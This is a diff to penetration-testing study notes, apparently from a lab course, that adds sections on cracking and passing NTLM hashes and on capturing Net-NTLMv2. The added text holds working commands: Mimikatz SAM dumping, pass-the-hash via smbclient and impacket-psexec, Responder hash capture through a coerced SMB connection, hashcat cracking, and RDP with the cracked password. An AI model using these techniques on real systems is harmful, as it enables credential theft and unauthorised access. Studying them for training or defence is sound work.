@@ -776,7 +776,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
    ssh -i id_rsa -p 2222 dave@192.168.161.201
    ```
 - password hashes  
-  - NTLM
+  - Cracking NTLM
     - NTLM (NT LAN Manager) is a Windows authentication protocol. Hashes stored in C:\Windows\system32\config\sam. Dumped via lsass.exe, pwdump, Mimikatz
     - Goals: get plaintext password from NTLM hash > pivot to othe system > reuse credentials (pass-the-hash, RDP, SMB)
     -  **[Mimikatz](https://github.com/gentilkiwi/mimikatz)** can extract plain-text passwords and password hashes from various sources in Windows and leverage them in further attacks like pass-the-hash (PtH). **Sekurlsa module**, which extracts password hashes from the Local Security Authority Subsystem (LSASS)
@@ -811,9 +811,61 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
       `hashcat --help | grep -i "ntlm"` >  1000 | NTLM  | Operating System
     - Crack by using rockyou.txt and best64.rule
       `hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
-    - 
-  - NTLMv2  
-  - relaying NTLMv2  
+  - Passing NTLM
+    - pass-the-hash (PtH) technique: authenticate to a local or remote target with a valid combination of username and NTLM hash rather than a plaintext password
+    - scenario: gained access to FILES01 as user 'gunther' > want to extract admin NTLM hash and authenticate to FILES02 (SMB share). Assume same password in FILES01 and FILES02
+    - [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html), [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec): SMB enumeration and management
+    - [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py), [wmiexec.py](http://github.com/fortra/impacket/blob/master/examples/wmiexec.py): command execution
+    - RDP or [winrm](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) to connect to target
+    - windows explorer: \\192.168.139.212\secrets (cannot login FILES02 as user gunther)
+    - Enabling SeDebugPrivilege, retrieving SYSTEM user privileges and extracting NTLM hashes
+      ```
+      .\mimikatz.exe
+      privilege::debug
+      token::elevate
+      lsadump::sam
+      ```
+    - **smbclient** with NTLM hash  
+      `smbclient \\\\192.168.139.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`  
+      `smb: \> get secrets.txt`  
+    - **psexec** to get an interactive shell
+      `impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`
+      `C:\Windows\system32> hostname`
+  - Cracking Net-NTLMv2
+    - goal: gain access to an SMB share on a Windows 2022 server from a Windows 11 client via NTLMv2
+    - NTLM Authentication over SMB
+      1. Client → Server: Hello, I want to connect to your SMB share. Here's my username.
+      2. Server → Client: Okay. Here's a random challenge (nonce). Prove you're who you say you are
+      3. Client → Server: Here's the encrypted challenge response using my NTLM hash.
+      4. Server → Itself (lookup): Let me check this response against the stored hash for that user.
+      5. Server → Client: Access Granted or ❌ Access Denied
+    - [Responder](https://github.com/lgandx/Responder): prints all captured NTLMv2 hashes
+    - set up Responder on our Kali machine as an SMB server and use FILES01 (at 192.168.139.211) as the target
+      `nc 192.168.139.211 4444`
+      `whoami` > files01\paul
+      `net user paul` > Remote Desktop Users
+    - don't have privileges to run Mimikatz but can set up an SMB server with Responder on Kali, then connect it with user paul and crack NTLMv2 hash
+    - Starting Responder on interface tap0 > SMB server is active
+      ```
+      ip a
+      sudo responder -I tun0
+
+      ##if ports in use, kill the process
+      sudo systemctl disable smbd
+      sudo systemctl disable nmbd
+      sudo netstat -tulnp | grep -E '445|139'
+      ```
+    - Using the dir command to create an SMB connection to our Kali machine  > access is denied
+      `dir \\192.168.45.181\test`  > respondener output the NTLMv2 hash of paul
+    - save paul hash and crack it with hashcat
+      ```
+      nano paul.hash
+
+      hashcat --help | grep -i "ntlm"  > 5600 | NetNTLMv2
+      hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+      ```
+   - RDP as paul `xfreerdp3 /u:paul /p:123Password123 /v:192.168.139.211 /cert:ignore /drive:share,/home/kali/share`
+  - Relaying Net-NTLMv2  
   - Windows credential guard  
 
 ### 16. Antivirus evasion  
